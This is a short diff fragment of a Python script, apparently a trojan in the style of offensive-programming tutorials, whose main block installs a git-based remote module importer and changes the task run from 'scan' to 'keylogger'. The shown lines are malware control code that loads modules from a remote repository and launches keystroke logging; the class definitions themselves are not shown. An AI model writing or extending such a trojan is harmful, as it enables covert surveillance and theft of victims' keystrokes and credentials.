@@ -123,5 +123,5 @@ if __name__ == '__main__':
 
     sys.meta_path.append(GitImporter())
     # sys.meta_path.append(LocalImporter('modules'))
-    trojan = Trojan('scan')
+    trojan = Trojan('keylogger')
     trojan.run()
